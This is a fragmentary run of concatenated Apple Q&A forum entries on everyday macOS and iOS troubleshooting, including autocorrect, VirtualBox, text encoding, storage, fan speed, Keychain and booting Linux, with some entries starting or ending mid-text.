eating my CPU.\nI now wonder if this was part of the background battery drain on my iPhone.\n", "Q: How to prevent autocorrect from correcting correctly spelled words? Is there a way to stop autocorrect from altering words that I spell correctly? While still keeping autocorrect on for incorrectly spelled words.\nSome examples off the top of my head, but there’s plenty more stupid stuff it does:\n\nI will do it today > I Will do it today\n\n(it thinks I mean a person called Will)\n\nBus stop > Bud stop\n\n(who knows!)\n\nSt Albans > At Albans\n\n(a city near London)\n\nI’ve ticked off the ones that are done > I’ve ticket off the ones that are done\n\n(✅ vs )\n\nLet’s see if they say yes > Let’s see of they say yes\n\n(Totally wrong)\nI have tried turning off Autocorrect in Settings > General > Keyboards; but this disables autocorrect completely. The words still pop up above the keyboard but it no longer autocorrects just by typing.\nIt can be quite frustrating to have iOS randomly change your sentence to something that doesn’t make sense because it thinks the grammar might be wrong or it’s trying to second guess what you’re typing, when I’ve typed something completely valid.\nAdding endless lists of words that iOS constantly wants to “correct” into the Keyboard Text Replacement option is not a solution in my opinion. The list of correctly spelled words that iOS likes to alter is vast. Also I already use the Keyboard Text Replacement feature extensively so I don’t want my own list polluting with this nonsense.\nSurely there is a way to not autocorrect correctly spelled words?\nIf not is there any app or Shortcut that bypasses this somehow?\nIs it “learning” these somehow? It seems to go through phases of changing certain words for a while until I correct it enough times.\n\nA: You only have to look at any of the webpages listing amusing autocorrect instances to see how problematic it is.\nI find it much more useful for the phone to offer 'suggestions' of words, above the keyboard, as I'm typing, instead of automatically changing what I've already written.\nThat way, it's one tap to complete or correct a word, once it's one of the options, and I don't end up with any problems when the phone ducks my ship.\nSo under Keyboards: turn \"Auto-Correction\" OFF and Predictive ON.\n\nA: There are few solutions, but none of them are too great. You could disable autocorrect entirely. You could add text replacement for a few of the most annoying corrections. Another option would be to use an alternate keyboard. Some keyboards have autocorrect that might work better than the system keyboard. I don't have any specific recommendations because I use the system keyboard myself, but there are several popular ones.\n\nA: So this problem became so bad for me that I spoke to Apple and we were able to figure out the steps needed to make your device unlearn words it gets wrong:\n\n*\n\n*Go to Settings > General > Keyboard > Keyboards\n\n*Ensure only the official keyboard is installed (your region + Emoji)\n\n*Back to General\n\n*Go to Dictionary, then remove all dictionaries, then add just Apple Dictionary + your region\n\n*Back to General\n\n*Go to Transfer or Reset iPhone > Reset > Reset Keyboard Dictionary\n\n*Enter your passcode\n\n*Confirm the final warning\n\n*Restart\n\nProblem solved!\nThis does not clear your Text Replacement list, so don’t worry about that (it’s synced to all devices via iCloud).\nIf you’re particularly worried, you could manually back up your device first in Settings > iCloud (your name) > iCloud > iCloud Backup > Back Up Now.\nNo more accidentally saying “I’m going to get a bud” when I’ve typed “I’m going to get a bus” \n", "Q: Run OS X 10.6 virtual machine on macOS 10.15 with VirtualBox I am struggling to create a Mac OS X 10.6 (Snow Leopard) virtual machine on macOS 10.15 (Catalina). How can I use Snow Leopard in VirtualBox on macOS Catalina?\nHere is what I have:\n\n*\n\n*macOS 10.15.7 (19H1217)\n\n*\n\n*Running on a MacBook Pro (Retina, 15-inch, Mid 2014)\n\n\n\n*VirtualBox version 6.1.22 r144080 (Qt5.6.3)\n\n*Max OS X 10.6 install ISO file\n\nAfter initial setup, VirtualBox gets here and no further:\n\n\nA: You are correct. I am using an iMac (21.5 inch, Late 2013) with Catalina 10.15.7 and the same version of Virtual Box. I solved your problem by have the firmware boot from z file. I chose to boot from FS1:\\System\\Library\\CoreServices\\boot.efi.\nThe simple solution is to enter the following at the Shell> prompt.\nFS1:\\System\\Library\\CoreServices\\boot.efi\n\nI used a Snow Leopard ISO file created from a Snow Leopard OS X 10.6 DVD purchased from Apple. For more information, see this answer.\nI needed to set the \"Audio Controller\" to ICH AC97, otherwise Snow Leopard would not boot after the installation completed. This change results in a Snow Leopard without sound.\nAfter installing, I immediately upgraded to OS X 10.6.8 by downloading Mac OS X 10.6.8 Update Combo v1.1 to the host, transferring to the virtual machine and installing.\nI enabled the 64 bit kernel by entering the following command, then restarting.\nsudo systemsetup -setkernelbootarchitecture x86_64\n\nGuest Additions failed to install with the following popup message.\n\n\nI had no problems installing Snow Leopard on a iMac (21.5-inch, Mid 2011) with High Sierra 10.13.6 and Virtual Box version 6.1.12 r139181 (Qt5.6.3). In other words, I did not need to change the \"Audio Controller\". I was able to upgrade to OS X 10.6.8 and enable the 64 bit kernel. However, Guest Additions failed to install with the following popup message.\n\nI assume Guest Additions would have installed, if an older version of VirtualBox was being used.\n\nA: I remember doing something similar to this a while back and ran into the same issues. I see the virtualbox people have not fixed that issue yet.\nThe best way to do this is to create a VM in VMWare Fusion. You can download it and use it for this for free. And as long as you are virtualizing macOS on an actual, physical, Apple branded Macintosh it should work.\nVMWare will boot and install macOS on a VM on a Mac running macOS out of the box with no complaints or problems. I did this with macOS Mojave but it should be simpler with an earlier version of macOS as long as you have the installer from Apple.\nIf you follow the instructions here, that should get you a working install of a macOS that you can use. These instructions involve Mojave but should work for earlier versions of macOS.\nI'm not going to quote the whole blog post here but you set up a VM in Fusion for the version of macOS you want and then create an ISO/DMG using a a few easy terminal commands then select that image as your bootable install media in VMWare Fusion and away you go with the standard macOS install procedure.\nThe trick here is that Virtualbox can directly use a VM created in Fusion, so when you are done with the install and have a bootable macOS VM in Fusion, you can delete Fusion and use Virtualbox.\nThere are a number of tutorials out there that can help with this. the one on my blog linked to the blog post linked above but there are others. Google is your friend. The trick is using VMWare Fusion to create the VM and then you can run it in Virtualbox.\n", "Q: Bash Eval Syntax Error Every time I open terminal Every time I open terminal, my mac makes a multitude of error sounds, and returns this output:\n-bash: eval: line 4: syntax error near unexpected token `?\n-bash: eval: line 4: `PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/share/dotnet:/opt/X11/bin:~/.dotnet/tools:????:H9???:?::I?F:A??I???E?closf?E?e::I?|\\$???:܅:?E?proxf?E?y:?{8??:?{8??:h:=:?E?preff?E?s:H?

(This is for a private, personal project, not any kind of pirating.) I just can't get it to line up right.\nI tried plugging the phone into the audio jack using just a standard 2-band stereo 1/8\" cable; that didn't work. I then tried plugging it in using my detachable headphone cable (which has an inline microphone). That cable has 2-band on one end and 3-band on the other. When I plugged the 2-band side into the MacBook, the sound preferences showed \"internal mic\" as the only input option, and nothing was recorded. When I switched the direction, the sound preferences showed \"external mic\" as an option, but then it just recorded the audio through the cable's inline mic, rather than the audio coming out of the headphone jack.\nWould love for this to be possible...

Alas that they don't seem portable.\nunicode number \"für\"\n--> {102, 252, 114}\n\nunicode number \"für\" encoding «class utf8»\n--> {102, 195, 188, 114}\n\nunicode character {195, 188}\n--> \"Ã¼\"\n\nWith the satimage osax installed, you can use the readtext and writetext commands to save to a file in a different encoding and then get its contents.\nuse scripting additions -- specifically Satimage.osax must be installed\nset sText to \"fÃ¼r Sie\"\nset pd to ((path to desktop) as text)\nwritetext sText to file (pd & \"brk2.txt\")\n\nset au1 to readtext file (pd & \"brk2.txt\") encoding \"UTF-8\"\n--> \"fÃ¼r Sie\"\nwritetext au1 to file (pd & \"fixed.txt\") encoding \"windows-1252\"\nreadtext file (pd & \"fixed.txt\")\n--> \"für Sie\"\n\nIn case you would rather work with the text inline, then other tools are required. If we take it outside of applescript and examine it in the shell using iconv, we can see some of the sordid details. NB Obviously I don't know which text encoding is actually responsible but I'll guess that its 'WINDOWS-1252' and as 'cp1252' is synonymous and shorter, I'll use that.\nThis takes the expected character and converts it from CP-1252 to UTF-8.\n% echo 'ü' | iconv -f cp1252 -t utf-8\n--> Ã¼\n\nMy guess is that some piece of infrastructure along the way (e.g. sending mail client, mail server, intervening gateway) is treating the text as being windows encoded. Then another piece (e.g. your mail server or client) is treating it as utf-8, and the result is a mess.\nThis probably won't work in all scenarios (because more than one conversion could occur en route) but in this case, a single transform suffices.\nUpdate: Since you're writing to a file, it's probably easiest to just have iconv read the file directly.\nset pdk to ((path to desktop) as text) & \"deskfil.txt\"\nset pf to POSIX path of pdk\ndo shell script \"iconv -t cp1252 -f utf-8 \" & pf\n\nSo if you can put the corrupted text into a variable, it's straightforward to get the shell to process it.\nI found inspiration from this helpful answer https://stackoverflow.com/a/14985394/7410243.

On Windows, I open the photo, click edit, drag the bars to where I would like to cut, and I save. It will save as mp4 and I can overwrite the video by selecting the original video before saving (giving the new video the same name). However, on mac, it's not so easy.\nMethod 1: Quicktime -- Open the MP4 video in Quicktime, trim it using an ios-like interface, and save the video as a MOV (no option to overwrite or to save as MP4). Import this MOV into Premiere Rush (which takes a long time to launch and is slow), tell premiere to export to mp4, and wait a minute. Then delete the original mp4 and the mov, and I've finally got the trimmed mp4.\nMethod 2: VLC -- https://www.videoproc.com/troubleshoot-vlc/cut-or-trim-video-in-vlc-on-mac.htm It's clunky, but faster than Quicktime and better suited to my needs. One downside is that I cant tweak the start point once I start recording, I cant see ahead and if it goes too far ill have to trim it a second time, and there are pauses at the beginning and end.\nMethod 3: iMovie -- this is my go-to method for splicing clips together and complex trimming (removing segments in the middle). However, it's slow to export and about as slow as the Quicktime method.\nI after researching, I could not find one app that trims as easily as Windows Video Player. I am asking the community if there is a simple, Quicktime-like video trimmer for mac that exports in MP4 instead of MOV. I am working with files that are usually 2-3 GB and therefore try to stay away from online services as much as possible (hence why I don't use cloud convert for mov to mp4).\nEdit: It needs to be free.\nSolution: along with losslesscut specified in the answer below, another solution is the Quick Look function. I'm not 100% sure if this is lossless, but if you want to simply trim video Quick Look has a simple video trimmer that allows you to replace existing video or create a new video in the original format. It is quite fast, making me think it is lossless.\n\nA: LosslessCut is free and meets these criteria.\nYou can download it here:\nhttps://github.com/mifi/lossless-cut/releases\nI recommend choosing the LosslessCut-mac.pkg file from the latest version available.\nOne thing to note is that mp4s cannot be cut anywhere but there are “key frames” which are where cuts can be done.

Historically I am sure older versions of OS X have sometimes forced me to install apps/files onto the volume/drive the OS is installed on.\nMaybe I misremember that but regardless in current versions macOS Catalina onwards, do I have total freedom?\nI am planning to get a new Intel-based Mac mini/iMac with the smallest SSD (256GB) and separately buy a large external SSD drive (2TB). I don't want to find that the internal drive is a limiting factor later - I might want to use the internal drive purely for the OS for instance.\n\nA: First of all: the largest contributor of 'stuff' to most people's disk storage is User documents.\nNone of these have to be in the user folder, and there is no problem opening and saving from an external drive (and there never has been). If space is a concern, then I would simply store all your documents on an external.\nDon't forget that you'll need another external drive for your backup disk.\nMost Applications can also be launched from any location. However, some applications install a variety of support files, which need to be in /Library/Application Support or other Library subfolder, (or the user's equivalent Library folder).\nApps also have working caches, preferences, and other files which are saved in the User's Library.\nI would recommend leaving applications in their default location. You are unlikely to fill a 256 GB drive just with System and Apps.\nOther files, like Photos.app's library, \"iTunes\" archive, Garageband samples, etc are normally stored on the system disk, but can be configured to other locations.\nFor a laptop, I would always recommend getting the largest internal storage you can afford (and then maybe some more!); but for an iMac or Mini, there's no inconvenience from an attached device.\n\nA: No. We have thousands of Macs at work with 256 storage as a standard. People that fill 256 also tend to fill 512 and tend to fill one TB boot drives.\nShort of needing three or more OS for testing, it’s rare to need that much space for the OS. Spend more on storage due to convenience, not need is my advice.\n\nA: If an app is bundling a system extension, Apple requires you to start the app from an \"appropriate Applications directory of the system\", which usually means /Applications.\nThis is probably a requirement to make it easier for the OS to track the System Extension and its host app (like detecting and handling updates). Once the app has been started and the app has requested the installation of its System Extension, Apple actually copies it somewhere else (a subdirectory of /Library/SystemExtensions) and starts it from that location. (You can see this with ps aux if you know the name of System Extension; you can list them using systemextensionsctl list).\nmacOS is somewhat tracking the app's directory at this point. If you try to move or delete the app using Finder, you get this message:\n\nThe application “Foobar” is hosting system extensions. These extensions will be removed if you continue.\n\n(Deleting/moving via the shell leaves the extension untouched. It continues to run; after all, it actually lives elsewhere.)\n\nA: I think you will find it makes things more complex with a smaller drive.\nFirst the external drive will be slower. For compiling and media work that might well matter.\nmacOS defaults to having user directories on the boot container. This includes ~/Library/Application Support which can get big - in my case Steam is biggest here.\nYou can make links to put sonme things on external disks but that gets complex\nSome Applications check or otherwise have to be installed in /Applications (They are arguably badly written but many exist)\nYou will end up costing more in time than chosing such a small SSD. Especially if you consider what happens over time say in 3 years things will need more space.\nI think you are better off using the money for the external SSD to buy a larger internal one now and later if you need more space buy an external one - You probably also want an external HD for backups, and that would also be fast enogh for storing media for playing\n\nA: I'd recommend you boot right off of the 2tb SSD. I boot off of a 970 EVO in a USB 10 Gbps enclosure on my iMac 2017. It's blazingly fast and works without any hiccups. In fact, I've been using this setup for around 3 months, and I used to use an 860 Evo for a couple of years before that. It really simplifies your plan for saving space. If your'e into video editing and such, Id recommending using the internal drive for those files that benefit from sequential speeds. Also, I get 900 MB/s on my boot drive. I have heard of some issues with booting off external in big sur 11.1 and 11.2, but I think it's gone now\nYou'd need a 3tb external HDD, too. Its not strictly necessary, but time machine has saved at least some of my files around 30 times.\n", "Q: Is it possible to check the current speed of the fan on a 2016-2017 MacBook Pro? Is \"resetting the SMC of your Mac\" at least a safe thing to try? I'm literally asking for a friend, who has a MacBook Pro 2016-2017 with no touch bar. (Big Sur 11.4, updated about 2 months ago).\nThey report that recently (noticed within the last week) when the laptop gets hot, usually when driving a very large BenQ monitor or perhaps when doing intensive numerical calculations, single pixel tall black lines appear across the bottom of the laptop's monitor in the Dock area. As the laptop continues to get hot over a period of 10 to 20 minutes, more isolated lines appear.\nTheir research shows that it appears to be a known problem with this model, and may be associated with something called a \"T-CON\" board.\nBefore considering a major repair, one bit of advice in this and this answer is to investigate the fan speed; is it going to full speed soon enough, does something need to be reset, etc. It also links to\n\n*\n\n*eidac.com: smcFanControl 2.6 released\n\n*Apple Support HT201295: How to reset the SMC of your Mac\nQuestion: Is it possible to check the current speed of the fan on a 2016-2017 MacBook Pro? If that suggests it's not running fast when the computer is hot, is \"resetting the SMC of your Mac\" at least a safe thing to try?\n\nA: I’d recommend macs fan control (https://crystalidea.com/macs-fan-control) for seeing fan speed right in menu bar. You can also create a rule that cools more aggressively to prevent the problem and, as a byproduct, reduce thermal throttling.\nAs for resetting the SMC, it won’t harm anything. It’s one of the steps you do, along with Nvram reset, when an issue comes up that you can’t explain. It may not work but it won’t do any damage.\nEdit: here is an image of the menubar display of macs fan control: \nThis is customizable in the Menubar Display segment of the Macs Fan Control preferences\n", "Q: Blurry font on Macbook Pro 2017 Catalina with Dell P2419HC Just bought a new external monitor to use with my Macbook Pro. Video and everything else is sharp but the font/text on everything is blurry which really affects my work when I look at Excel sheets.\nTried removing font smoothing and restating my laptop but doesn't seem to work. Any idea on how to fix this?\n\n\nA: Your MacBook Pro's native display has 219 pixels per inch.\nYour Dell display has 92 pixels per inch.\nApple's font smoothing technology is designed for high-resolution displays. MacOS used to include code to improve text on low-res screens, but it was removed a while ago.\nIn short: yep, text will look crappy on displays without a high pixel density using macOS.\nIf you look at the \"Related\" panel on this webpage, you will see lots of similar queries and responses.\n", "Q: DNS services uses cellular data even when it's disabled I have noticed this happening for over 3 months now, on both my old phone and the new one I got, which wasn't backed up from the old one. If I disable wifi, then go into the system services usage statistics, DNS services will have used any where from 5-40 kb of data, despite the fact that cellular data is still disabled.\nI've also had it where, after resetting statistics, both it and push notifications have went up, again, despite cellular data being disabled.\nBest way to reproduce is reset statistics, then disabled wifi.\nHas anyone else experienced this, or is anyone else able to reproduce this?\nEdit: To clarify, I am aware DNS lookups happen on both cellular and wifi. But the statistics go up on cellular when both it and wifi are disabled.\n\nA: I have had the same problem although I hadn’t noticed it went up with both celullar data and WiFi disabled. With this information I have come with an hypothesis that explains this:\nThe first thing that the client does when trying to connect to a service is to interact with the DNS server to ask for the IP of the service.\nWhen both cellular data and WiFi are off, the client will fail to connect to the DNS server and will probably just keep trying, sendind packets over and over again.\nThe good news is that this happens locally on the device and thus the traffic doesn’t go trough your internet provider. If many apps are doing this constantly, it could add up to gigabytes of “traffic”.\n", "Q: Actual time on netflix apple tv When pausing Netflix on my apple TV it usually shows how far into the show I am, and at the right side of the bar will be how many minutes until the end of the show.

I am wondering how to get it to show the clock time (e.g. 11pm) all the time\n\nA: You can see the time by tapping (not clicking) a second time after the elapsed time becomes visible.\nYou cannot switch this to appear permanently or by default.\n", "Q: How I can I open CSV/Excel files in Finder and have them open in the Google Sheets editor? On my work computer, I'd like to be able to open CSV and Excel files from within Finder and have them load directly into the Google Sheets editor.\nSetting Finder to open the files in Google Chrome does load the file in Google Drive, but you still need to go one more step and click \"Save as Google Sheets\".\n\n\nA: I don’t think it’s possible directly via finder. For convenience, you can use chrome to install the gdoc web app, then launch the app from launchpad and click open, then drag the file in.\nWhen using backup and sync, the extension .docs does exactly what you want, but that’s just a rebranded URL file.\n\nA: *\n\n*If you haven't done yet, install Google Drive for Desktop\n\n*Find CSV/Excel file using Finder from Google Drive mounted unit (you might have to move your CSV/Excel files to Google Drive first)\n\n*Right click the file and select Open with Google Sheets\n\n\nA: You can download Google Drive For desktop, then set .csv as default to Backup and Sync.

Simply set entire system default python to 3.7.\nThanks a lot!\n\nA: Python is python 2, for legacy applications. To use python 3, you must use the command python3. So python3 —-version should be what you are looking for.\nEdit: I missed that you're using pyenv. Maybe it's a bug with pyenv, but python3 should still bring python 3.\n\nA: Make sure your Python installation appears in your PATH before the system Python.\nEdit ~/.bash_profile or the profile file for the shell you're using and add\nexport PATH=/path/to/your/python/bin/folder:$PATH\n\nwith the path to the folder containing your python.\n", "Q: How to view passwords of key chain on iPad? I'm using iCloud. I know that passwords for web sites which are saved in Keychain Access app can be viewed on iPad, but I want to see other passwords on that app.\nFor example, I saved the password of my Timemachine backup in my Keychain Access app. When my PC is broken and I want to recover it from a backup, I have to read that password from other devices.\n\nA: iCloud keychain only does web login, and the mac keychain has added functionality in a local keychain. My workaround to this is to make up a fake website and add your password via your iPad using the fake domain. For example, add your password with username \"Time_Machine\" and website \"time_machine_password.com\".

For example, if I'm in a browser, it will start scrolling.\nI tried to download Razer Synapse, but it's not detecting the mouse at all. This might be because it's running with Rosetta since it's only made for Intel Macs right now.\nThis is briefly discussed here: https://developer.apple.com/forums/thread/649829\nIndeed, I get the same error as some in that thread:\nsudo kextload /Library/Extensions/RazerHid.kext\n\nExecuting: /usr/bin/kmutil load -p /Library/Extensions/RazerHid.kext\nError Domain=KMErrorDomain Code=71 \"Incompatible architecture: Binary is for x86_64, but needed arch arm64e\nUnsupported Error: one or more extensions are unsupported to load   Kext com.razer.common.razerhid v21.94 in executable kext bundle com.razer.common.razerhid at /Library/Extensions/RazerHid.kext\" UserInfo={NSLocalizedDescription=Incompatible architecture: Binary is for x86_64, but needed arch arm64e\nUnsupported Error: one or more extensions are unsupported to load   Kext com.razer.common.razerhid v21.94 in executable kext bundle com.razer.common.razerhid at /Library/Extensions/RazerHid.kext}\n\nIt seems like Razer is not going to support macOS, but it's surprising to me that there's no \"easy\" way to simply remap the back/forward buttons... am I just missing something?\n\nA: I ended up getting this to work with BetterTouchTool.

I need to change the country of my Apple ID, and I already found that fortunately any apps that did cost money will be available for free download after I do this (as long as the app exists in my new country of course).\nBut I couldn't find out whether the data of the app is also kept when I redownload an app I already have on my device - like the progress in a game, any data that is stored like photos or documents etc.\nDoes anyone happen to know?\n\nA: Changing which country's App Store you're logged in to does not require you to re-download your apps. All installed apps will continue to work as before. You do not need to delete the app and re-download it from the new country.\nIn case you have apps that were installed, but currently not stored on the device due to offloading, you can re-download those apps even after changing country - and your data will still be there.\nNote: Some apps are not offered in all countries.

I am new to Apple computers (I have used Windows) and I do not have much experience.\nI know that Finder is app like other apps and is Mac alternative to Windows Explorer. I am unable to find the Finder icon in list of all apps.\nWhy is that so?\n\nA: This is by design\nFinder is the default graphical file manager that comes pre-installed with macOS. It gets launched automatically for you as soon as you login, and keeps running throughout your login session.\nWhile Finder is a graphical app, like many others that comes pre-installed, and the ones that can be installed on your Mac, macOS does not provide a user visible app icon (app bundle) for it in the list of apps. (Power users can, thought access the Finder.app bundle here: /System/Library/CoreServices/Finder.app).\nThat's the reason why you cannot see Finder.app icon either in the Applications folder, or in Launchpad (the grid of icons that's displayed when you press the F4 key on your keybaord or the Launchpad icon on your MacBook's Touch Bar).\nFinder icon is always displayed in the macOS Dock, which can be found in the bottom of the screen (the Dock can be set to be placed in Left or Right side of the screen too, and can also be set to auto-hide). So, to access the Finder app, you can click on the Finder icon displayed in the Dock.\nIf you wish to re-lauch (quit and launch) the Finder app, you can do so by going to  Menu → Force Quit...

Where does Script Editor noramlly save its content?\n\nA: \nThey are saved in the 'default' way where I simply CmdQ.\n\nIn macOS Catalina and macOS Big Sur I do not find that to be the case. If in Script Editor, if I press ⌘Q I'm presented with a Save As dialog box where I have to choose between Delete, Cancel or Save.\n\nWhere does Script Editor noramlly save its content?\n\nThat said, when Script Editor opens a document, what happens is at ~/Library/Autosave Information/ a file named com.apple.ScriptEditor2.plist is created/updated and a file named Unsaved Script Editor Document.scpt is created/updated. As more documents are created a new document named, e.g., Unsaved Script Editor Document 2.scpt, where the number in the document name is incremented as more documents are created.\n\nA: There are three places I can find where this data is stored.\n~/Library/Saved Application State/com.apple.ScriptEditor2.savedState\nThis, in common with most saved state folders, remembers which files were open & their window positions etc. It only does this for existing script files, already saved somewhere on your disk.\n~/Library/Autosave Information/com.apple.ScriptEditor2.plist  and\n~/Library/Autosave Information/Unsaved Script Editor Document\nThese are responsible for holding the contents of completely unsaved files.\nWhen you Quit & rely on autosave, then completely unsaved files are saved in the Autosave folder, previously saved files have their changes written back to their existing saved file location.

This takes about 100 MB of space.\nBasic steps are given below. (Not necessarily in this order).\n\n*\n\n*Create a Windows installer bootable flash drive.\n\nNote: This usually is easier to create  when the firmware updates included with High Sierra or newer versions of macOS have been installed.\n\n\n\n*Shrink the disk0s2 on the SSD and create a 100 MB ExFAT partition.\n\n\n*If necessary, change SSD to hybrid partitioning.\n\n\n*Boot from the Windows installer.\n\n\n*Open a Command Prompt window.\n\n\n*Use the diskpart command to format the Windows partition on the SSD. and make this partition active.\n\n\n*Install the boot software to the MBR, VBR and Windows partition on the SSD. For the MBR and VBR use the bootsect command. For the Windows partition, use the bcdboot command. Have the boot software installed so Windows can reside on the HDD.\n\nNote. The Volume Boot Record (VBR) refers to the first sector of the Windows partition you wish to BIOS boot from. Actually, this boot software may cover more than just the first sector.\n\n", "Q: Intel MacBook Pro 2020 battery life much shorter than advertised Ever since I updated to Big Sur, I've noticed my battery life on my intel MacBook Pro 2020 13 inch is quite poor.

This is far below the 10 or 11 hours or so reviewers seem to get on the device.\nI got coconut battery so I know I'm 200 cycles in and the battery is at 87% capacity so it's not battery degradation.\nI've reset SMC and PRAM multiple times to no avail.\nI also can't find a good source of the drain, my activity monitor doesn't show any processes taking up huge CPU usage, I see no more than 20% use when I'm using Safari.\nI have no idea what to do here, has anyone faced this problem and knows a solution??\nThanks\n\nA: I'd recommend clicking on the battery icon in your menubar.

I.e. this means that at line 125 in backtrace.rs is the code that this node represents (which is then 10 bytes of machine code after the beginning of the function.\nNote: In the above I write \"time spent\", however you should be aware that technically this is a sampling profiler - so it actually means \"how many time was the program sampled at this particular point\".\nAs sample by defaults samples once per millisecond (which you're also doing) this means that you can think of this as the number of milliseconds spent at that node.\nAgain, as it is a sampling profiler, you get no information about what happens when the process is not being sampled. I.e. that the process is doing X when you sample it 10 times in a row doesn't necessarily mean that it spent 10 milliseconds doing X, it could be spending 5 milliseconds doing X and 5 milliseconds doing Y, but you just never happened to sample when it was doing Y.\nRegarding your final question, this means that the output does not tell you how frequently a particular function was called (i.e. 100 samples of 100 separate calls to a function could show up the same in the output as 100 samples of 1 very long call to the function).\n", "Q: What is necessary to boot Linux on a Mac? I've seen some various guides online about different ways to boot Ubuntu from an SD card or a USB stick. They have some variation with regards to making it always boot from the external memory or fully installing it on the MacBook, for example. Apple does not seem to provide any official information on how to do this. Ubuntu provides information about downloading Ubuntu to an SD card, but not what it takes on the Mac end.\nI'm curious to understand underlying principles. What is necessary to get the Mac to boot Ubuntu, if it is on a USB stick or SD card?\nDoes the Ubuntu download need to be formatted a certain way, with diskutils? Why?\nDoes the Mac drive need to be partitioned a certain way? Why?\nDoes anything need to be done with the booting software, grubloader?\nAt minimum, is it possible to just download Ubuntu to an SD card, stick it in the computer and turn it on? Why would the computer immediately know to boot from the external memory?\n\nA: There are several tutorials online that tell you how to format a bootable drive and use it to boot up.  They usually instruct the user to download an image, use something like balena Etcher to \"flash\" it, and then select it as the boot drive during the startup process.\nhttps://www.ecosia.org/search?q=booting+ubuntu+from+usb+mac\nThis should help you.\n\nA: The simplest instructions would be to use Ubunutu's instruction for transferring to USB stick. Restart the Mac and hold down the option key. Select to boot from the icon labeled EFI Boot.\nIf etcher will not accept an SD card, then try the command line method.\nYou state in the comments that you would like a conceptual understanding of what is even happening when Mac \"boots\" from any external memory device. Well here goes:\nHold down the option key at startup. This instructs the Mac to boot to the Mac Startup Manager stored in the firmware on the logic board. The Mac startup manager looks for external drives with readable volumes containing the file \\EFI\\BOOT\\BOOTX64.EFI. If found, then a icon with the label EFI Boot will appear. If you select this icon, then the Mac Startup Manager will instruct the boot loader in the firmware on the logic board to boot from this file. Eventually, Grub will execute and often you are presented with a menu of boot options. You can select to boot from a live version of Ubuntu. Grub will then boot the live version of Ubuntu.\nBe aware, often a Linux ISO will offer more than one way to boot. The method used can depend on the model/year Mac you are using. My explanation is just one possible scenario.\n", "Q: How can I selectively copy preferences from one machine to another? How can I selectively copy app preferences from an older machine to a newer one?\n\n*\n\n*Is it sufficient to copy the preferences files from (e.g.) ~/Library/Preferences?\n\n*Will there be any side effects to doing that?\n\n*Will I need to ensure that apps care closed when I copy the file?\n\n*Will I need to reboot to flush anything from memory?\n\nIf the above approach does in fact work, is there an easier way?  I've tried the app SyncSettings but was not able to get it working at all for any app preferences at all.  And I haven't found any other apps that claim to do the same thing.\nPlease do not tell me to use migration assistant.  I have huge amounts of stuff on my old machine and one of the benefits of a new machine is a fresh start.  If I copy everything over, I not only delete stuff on my new machine that I want to keep, but I keep everything from the old machine that I don't want.  Lose-Lose.\nI am looking for a solution that allows selectively moving preferences over.\n\nA: There is no rigid standard on macOS for location of preference files, nor of data.  This is particularly true for apps from outside the App Store.\n\n*\n\n*Is it sufficient to copy the preferences files from\n~/Library/Preferences?\n\nOnly if the app keeps its preferences in ~/Library/Preferences.\nSome apps will have preferences inside: ~/Library/Containers', or '~/Library/Application Support\n\n*\n\n*Will there be any side effects to doing that?\n\nThere could be. For example, a preference which points to a physical location in the file system.\nThe app may also keep data in other locations within ~/Library. If you are lucky in ~/Library/Application Support, but could be elsewhere. Further, if an app has computer wide (not just user) data, it may keep preferences and files (e.g. licenses) in /Library or somewhere in /Users.\nLicenses can be particularly tricky as they are often partially hidden.\n\n*\n\n*Will I need to ensure that apps are closed when I copy the file?\n\nSafer to make sure that the app is closed. Probably not essential.\n\n*\n\n*Will I need to reboot to flush anything from memory?\n\nIn most cases no, but it could a wise precaution.\nFurther thoughts\nI hope I have convinced you that there is no guaranteed way of transferring the required data from one computer to another.  Even Migration Assistant is not 100% - it is only an assistant.\nThough a few apps will be easy to transfer, you will need to check each one as you go.\nBut I do favour the \"fresh start\" approach to a new computer. Make sure you have all your license information before you start.\n\nA: How is the selection to be made, if not manually?\nShare the ~/Library folder on one of the computers, and then sit at one computer with two Finder windows, one for each library, comparing and transferring the contents of each folder, systematically.\n", "Q: Creating your own SF Symbol - for unfound emoji?

I'm developing a game using WebGL and I'm looking to use WebGL2, but currently Safari doesn't support it. However, the next version of Safari (15), which is set to release this fall via the Monterrey update, will!\nHowever, I'm still not sure whether or not it is a good idea to use WebGL2, considering I am not sure how quickly the support for WebGL2 will convert amongst iOS users.\nThat is, will only new iPhones be eligible for the latest Safari? Does it automatically update, or manually? And if currently released iPhones are eligible, then what determines how far back eligibility goes? Will iPhones released from several years ago also have access to the latest version of Safari? Also, will Safari 15 release for Desktop and iOS simultaneously?\n\nA: \nHow do you determine if your iPhone is eligible for the latest Safari?\n\nBy determining if the iPhone is capable of running the latest version of iOS. Safari comes bundled with iOS and a version of Safari is tied to the version of iOS running on device.\n\nwill only new iPhones be eligible for the latest Safari?\n\nAll the iPhones that support running iOS 15 will be able to run the desired version of Safari. iOS 15 is supported on the following iPhone:\n\n*\n\n*iPhone 12\n\n*iPhone 12 mini\n\n*iPhone 12 Pro\n\n*iPhone 12 Pro Max\n\n*iPhone SE (2020 - second generation)\n\n*iPhone 11 Pro Max\n\n*iPhone 11 Pro\n\n*iPhone 11\n\n*iPhone XS Max\n\n*iPhone XS\n\n*iPhone XR\n\n*iPhone X\n\n*iPhone 8 Plus\n\n*iPhone 8\n\n*iPhone 7 Plus\n\n*iPhone 7\n\n*iPhone SE (first generation)\n\n*iPhone 6s Plus\n\n*iPhone 6s\n\n\nDoes it automatically update, or manually?\n\nSupported iPhone does not automatically update to iOS 15. They have to be updated with the consent of the user.\n\nAnd if currently released iPhones are eligible, then what determines how far back eligibility goes?\n\nApple decides which model of iPhone to support with the upcoming release of iOS. All the iPhone which ran iOS 13 and iOS 14 are capable of running iOS 15. This included iPhone as far back as iPhone 6s, released in September 2015.\n\nWill iPhones released from several years ago also have access to the latest version of Safari?\n\nAll the iPhone released in the year 2015 and later are capable of running iOS 15.\n\nAlso, will Safari 15 release for Desktop and iOS simultaneously?\n\nOnly Apple can answer that, but from historical pattern, a new major of iOS/iPadOS and macOS are made around the same time frame. Sometime they get released simultaneously, but the release can also happen a few weeks apart.\n", "Q: Use Safari Technology Preview with a different \"profile\" Is there a way to run Safari Technology Preview using a different \"profile\"?\nLike loading a different Library\nFor work (and development) reason I would need to run Safari and Safari TP like they were not sharing any data: cookies, bookmarks, history etc.\n\nA: Unfortunately, no.\nI've yet to find any way of doing this with Safari.\nYou can Safari Technology Preview as 2nd browser instance. \nBut it will have all settings, history, etc. as your main Safari.\n\nIn macOS Monterey, you can also use tabs groups and hotkey  Opt + Command 